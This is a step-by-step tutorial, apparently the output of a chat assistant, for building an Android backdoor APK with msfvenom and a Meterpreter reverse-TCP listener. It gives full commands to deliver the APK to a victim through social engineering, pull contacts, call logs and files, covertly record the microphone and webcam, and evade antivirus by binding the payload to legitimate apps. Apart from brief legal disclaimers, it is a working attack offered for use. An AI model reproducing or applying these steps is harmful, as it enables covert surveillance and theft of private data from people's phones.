⚠️ Warning:
This guide is for educational and authorized penetration testing only. Unauthorized access to systems is illegal and unethical.

✅ Requirements:
Kali Linux (latest version)

Metasploit Framework (comes pre-installed)

apktool and keytool (optional, for APK binding)

Android device (your own or authorized testing)

🧪 Step 1: Generate Android Payload APK
Open a terminal and run:

bash
Copy
Edit
msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o android_payload.apk
Replace:

YOUR_IP with your Kali IP address.

4444 with your desired port.

Example:

bash
Copy
Edit
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o /root/Desktop/backdoor.apk
🧲 Step 2: Set Up Metasploit Listener
Open msfconsole:

bash
Copy
Edit
msfconsole
Then run:

bash
Copy
Edit
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
Wait for the session to open when the victim installs and opens the APK.

📲 Step 3: Deliver Payload to Target Device
Use social engineering or bind it with a real app (not covered here) and send via:

Email

Fake website

File sharing

The victim must install and open the APK for the payload to activate.

📟 Step 4: Control Android Device (Meterpreter)
Once the victim installs the app, you’ll get a Meterpreter session:

bash
Copy
Edit
meterpreter >
Run commands to extract information:

🧾 Extract Contacts:
bash
Copy
Edit
dump_contacts
📞 Extract Call Logs:
bash
Copy
Edit
dump_calllog
📁 Explore Files:
bash
Copy
Edit
ls
cd /sdcard/
download somefile.jpg
📷 Capture Webcam:
bash
Copy
Edit
webcam_snap
🎤 Record Audio:
bash
Copy
Edit
record_mic
🔚 Step 5: Close Session
To exit:

bash
Copy
Edit
exit
Or background the session:

bash
Copy
Edit
background
🧼 Optional: Evade Detection
Use tools like:

apktool to bind with a legit APK

msfvenom -x original.apk for payload injection

Obfuscators to bypass AV detection

🛑 Legal Reminder
Metasploit must only be used in legally authorized environments—on your own devices or with written permission.
